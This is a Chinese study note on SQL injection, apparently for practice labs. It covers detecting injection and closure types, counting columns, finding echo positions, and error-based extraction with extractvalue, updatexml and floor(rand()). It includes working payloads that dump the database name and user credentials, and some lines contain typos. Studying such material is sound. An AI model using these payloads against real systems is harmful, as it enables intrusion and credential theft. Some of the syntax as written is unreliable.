sql注入知识点总结

有些页面只能显示一个内容，第二句内容不显示，可以把第一句的内容改为数据库不存在的数据，如-1 999 等
注释符号 –+ # %23 需要注释符号来注释掉多余的符号 如字符型注入后的单引号

做题步骤

1,首先要知道是字符型注入(包括闭合类型)还是数字型注入

判断方法:
1，数字型是传递数字参数 如 1 和 2-1 的返回是相同的，而字符型在传递参数2-1时会返回 传递参数为2的结果(将2-1当作2，没有进行数字运算)
2, 输入 1 and 1=1 和 1 and 1=2 都能正常显示页面，则为字符型
3，输入 1’ and ‘1’=’1 和 1’ and ‘1’=’2 不报错的是字符型，报错的是数字型
数字型不用闭合(输入的 and 1=1 会被当做命令执行)，而字符型需要闭合(输入的 and 1=1 会被引号包住，不会被当做命令执行)
字符型的四种闭合方式 ：’ “ ‘) “)
判断闭合方式:
1’报错，1”不报错 1’ –+不报错 确认为单引号闭合
1’报错，1”不报错 1’ –+报错 1’)报错 为单引号加括号闭合
1’不报错，1”报错 1” –+不报错 确认为双引号闭合
1’不报错，1”报错 1” –+不报错 1”)报错 为双引号加括号闭合

2，猜解sql查询语句中的字段数

1，group by 1’ or 1=1 group by 1 –+ 1’ or 1=1 group by 2 –+ 依次增加，直到报错，报错前的数为字段数 推荐二分法
2，order by 1’ or 1=1 order by 1 –+ 1’ or 1=1 order by 2 –+ 依次增加，直到报错，报错前的数为字段数 推荐二分法
3, 1’ union select 1,2,3 –+ 1’ union select 1,2 –+ 更改数目直到不报错

查询回显位
将执行的命令插入到1’ union select 1,2,3 –+ 中的1,2,3中的一个。有回显的为回显位，一般1不是回显位，后两个为回显位

group_concat() 确保所有查询信息能放到一行显示出来

报错注入

1,extractvalue报错

查询作者

查询书名

select extractvalue(列名,’/路径’) from xml;

报错方式:将路径前面的符号写错
如elect extractvalue(doc,’~book/author/surname’) from xml;

将路径改为命令

concat 拼接
~的ASCII码为0x7e
查表名

查列名

extractvalue报错默认只能返回32个字符
需要用substring来解决

~用来隔开username和password，更易于观察。25,30表示从第25个字符再显示30个字符

updatexml报错

select updatexml(doc,’/book/author/surname’,’1’) from xml;
报错方式:将路径前面的符号写错
-1’ union select 1,updatexml(doc,concat(0x7e,(select database())),3),3 –+
与extractvalue报错基本相同

floor报错

rand()函数:随机返回0~1间的小数
floor()函数: 小数向下取整数。
ceiling()函数: 小数向上取整数。
concat_ws函数: 将括号内数据用第一个字段连接起来
as:取别名
limit: 显示指定行数
count()函数: 汇总统计数量

select rand() 计算结果在01之间
select rand()*2 计算结果在02之间
select rand()*2 from users 根据user的行数随机显示结果
select fioor(rand()*2) 结果随机为0或者1
select concat_ws(‘-‘(select database()),floor(rand()2)) from users
select concat_ws(‘-‘(select database()),floor(rand()2)) as a from users group by a
起名为a，分成0和1两组
select count(),concat_ws(‘-‘(select database()),floor(rand()2)) as a from users group by a
count()统计两组的数量
偶尔出现报错
通过在rand()内填入0或4来使它必然报错
select count(),concat_ws(‘-‘(select database()),floor(rand(0)*2)) as a from users group by a
原理:rand()函数进行分组group by和统计count()时可能会多次执行,导致键值key重复
统计时会先进行运算，看组中是否有满足的，但是一开始是没有分组的，所以第一次没有进入组中，第二次才进入组中(假如为1)，那么当遇到一个数为0而下一个为1时。会由于组中没有0而写入下一个数为组名，但是组中已经有为1的组名了。产生报错

-1’ union select 1,count(*),concat_ws(‘-‘(select concat(id,username,password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a –+

limit 0,1  从第零行开始一次显示一行
limit 1,1  从第一行开始一次显示一行
